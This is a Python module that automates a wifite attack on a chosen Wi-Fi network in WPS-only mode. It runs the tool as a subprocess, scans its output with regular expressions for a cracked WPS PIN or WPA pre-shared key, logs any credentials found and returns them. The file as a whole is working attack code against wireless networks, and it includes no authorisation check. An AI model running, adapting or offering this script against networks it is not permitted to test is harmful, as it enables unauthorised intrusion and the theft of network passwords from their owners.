import subprocess
import time
import re
import logging
import os
from constants import BASE_DIR
from utils import strip_ansi

ATTACK_TIMEOUT = 360
WIFITE_ARGS = [
    "wifite",
    "--wps-only",
    "--ignore-locks"
]


def extract_psk(line):
    if "WPA PSK:" in line or "PSK/Password:" in line:
        match = re.search(r'(?:WPA PSK|PSK/Password):\s*(.+)', line)
        if match:
            psk_candidate = match.group(1).strip().strip("'\"")
            if psk_candidate.lower() != "n/a":
                return psk_candidate
    return None


def extract_pin(line):
    if "WPS PIN:" in line or "Cracked WPS PIN:" in line:
        match = re.search(r'WPS PIN:\s*([0-9]{8})', line)
        if match:
            return match.group(1).strip()
    return None


def attack_target(interface, essid):
    logging.info(f"Starting attack on {essid}...")

    os.makedirs(BASE_DIR / "data", exist_ok=True)
    os.chdir(BASE_DIR / "data")

    proc = subprocess.Popen(
        WIFITE_ARGS + ["-i", interface, "-e", essid],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    psk = None
    pin = None
    start_time = time.time()

    for line in proc.stdout:
        line = strip_ansi(line.strip())
        if not line:
            continue
        logging.debug(f"[wifite] {line}")

        if not psk:
            psk = extract_psk(line)
            if psk:
                logging.info(f"PSK found for {essid}: {psk}")
                break

        if not pin:
            maybe_pin = extract_pin(line)
            if maybe_pin:
                pin = maybe_pin
                logging.info(f"WPS PIN found for {essid}: {pin}")

        if time.time() - start_time > ATTACK_TIMEOUT:
            logging.warning(f"Attack timeout ({ATTACK_TIMEOUT}s) reached for {essid}, terminating.")
            proc.terminate()
            break

    proc.terminate()

    if psk:
        return {"psk": psk, "pin": pin}
    elif pin:
        return {"pin": pin}
    else:
        logging.info(f"Attack on {essid} failed. No credentials obtained.")
        return None
